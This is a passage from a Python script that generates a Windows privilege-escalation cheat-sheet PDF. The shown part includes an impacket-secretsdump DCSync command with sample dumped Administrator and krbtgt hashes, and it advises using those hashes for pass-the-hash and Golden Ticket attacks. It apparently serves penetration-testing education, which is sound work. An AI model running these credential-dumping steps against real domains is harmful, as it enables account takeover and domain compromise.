    "impacket-secretsdump &lt;domain&gt;/&lt;user&gt;@&lt;dc-ip&gt; -hashes :&lt;NT-hash&gt;"
))
story.append(Paragraph("Output:", body_style))
story.append(code_block(
    "Administrator:500:aad3b435b51404eeaad3b435b51404ee:&lt;NT-hash&gt;:::\n"
    "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:&lt;NT-hash&gt;:::"
))
story.append(Paragraph(
    "Use the Administrator NT hash for Pass-the-Hash to any domain machine. "
    "The krbtgt hash enables Golden Ticket attacks. See the PtH cheatsheet.",
    note_style,
))

story.append(sp(14))
story.append(HR)
story.append(Paragraph(
    "<b>Key idea:</b> Windows privilege escalation is a checklist, not a linear path. "
    "<b>SeImpersonatePrivilege</b> (Potato attacks) is the fastest route — "
    "if you land as a service account, it is almost always exploitable. "
    "Service misconfigs are the next most common vector. "
    "For domain escalation, BloodHound maps the path; "
    "ACL abuse and DCSync close it. "
    "Always run automated tools first — they surface the vector in seconds.",
    key_style,
))

# ── Build PDF ─────────────────────────────────────────────────────────────────
doc = SimpleDocTemplate(
    OUT,
    pagesize=letter,
    leftMargin=0.85 * inch,
    rightMargin=0.85 * inch,
    topMargin=0.85 * inch,
    bottomMargin=0.85 * inch,
    title="Windows Privilege Escalation — Cheat Sheet",
    author="Chained Tools",
)
doc.build(story)
print(f"[+] PDF saved: {OUT}")
